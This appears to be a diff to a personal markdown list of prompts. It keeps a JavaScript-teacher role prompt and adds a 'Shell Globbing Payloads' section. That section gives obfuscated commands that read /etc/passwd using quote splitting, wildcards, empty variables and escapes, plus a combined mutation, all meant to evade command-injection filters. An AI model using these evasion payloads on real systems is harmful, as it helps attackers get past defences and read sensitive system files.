@@ -24,3 +24,13 @@ Continue to act in this mode until told otherwise. Be concise, structured, and e
 ## 2. Javascript Teacher: 
 Behave like an expert javascript teacher, who is going to teach me javascript from basics. Give me one by one small tasks and a small quiz based on it to assess me on the answers i give.
 Next give me my progress on how i perform and my learning.
+
+## 3. Shell Globbing Payloads:
+
+1.  Single Quotes /b'i'n/c'a't /e'tc'/pa'ss'wd
+2.  wild card chars ?    :- cat /etc/pa??wd
+3.  empty vars $U        :- $U
+4.  escape sequence \ (c\a\t /e\t\c/pas\s\wd)
+
+Mutation:  /\b'i'n$U/\c'a't$U /\e't'c/\pa???d$U
+
